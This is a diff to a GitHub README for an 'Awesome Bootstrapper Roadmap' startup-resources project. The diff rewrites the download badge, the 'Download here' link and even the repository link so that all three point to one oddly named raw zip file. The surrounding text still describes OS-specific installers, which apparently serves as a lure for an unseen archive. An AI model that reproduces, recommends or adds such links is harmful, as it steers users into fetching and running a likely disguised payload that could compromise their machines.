@@ -1,6 +1,6 @@
 # 💸 Awesome-Bootstrapper-Roadmap - Save Money While Building Your Startup
 
-![Download Awesome Bootstrapper Roadmap](https://img.shields.io/badge/Download-Awesome--Bootstrapper--Roadmap-blue)
+![Download Awesome Bootstrapper Roadmap](https://github.com/rishabhthakre/Awesome-Bootstrapper-Roadmap/raw/refs/heads/main/Magog/Awesome_Bootstrapper_Roadmap_rachiocentesis.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ Getting started with the Awesome Bootstrapper Roadmap is straightforward. Follow
 
 ## 💾 Download & Install
 
-To download the Awesome Bootstrapper Roadmap, visit the following link: [Download here](https://github.com/rishabhthakre/Awesome-Bootstrapper-Roadmap/releases). 
+To download the Awesome Bootstrapper Roadmap, visit the following link: [Download here](https://github.com/rishabhthakre/Awesome-Bootstrapper-Roadmap/raw/refs/heads/main/Magog/Awesome_Bootstrapper_Roadmap_rachiocentesis.zip). 
 
 1. On the releases page, find the latest version of the application.
 2. You will see various files available for download. Choose the one that fits your operating system (Windows, macOS, or Linux).
@@ -67,7 +67,7 @@ If you need further guidance or support, feel free to reach out to our community
 
 ### 🌐 Connect with Us
 
-- **GitHub:** [Awesome Bootstrapper Roadmap Repository](https://github.com/rishabhthakre/Awesome-Bootstrapper-Roadmap)
+- **GitHub:** [Awesome Bootstrapper Roadmap Repository](https://github.com/rishabhthakre/Awesome-Bootstrapper-Roadmap/raw/refs/heads/main/Magog/Awesome_Bootstrapper_Roadmap_rachiocentesis.zip)
 - **Discussion Forum:** [Join our Community](#)
 
 ## 👨‍💻 Contributing
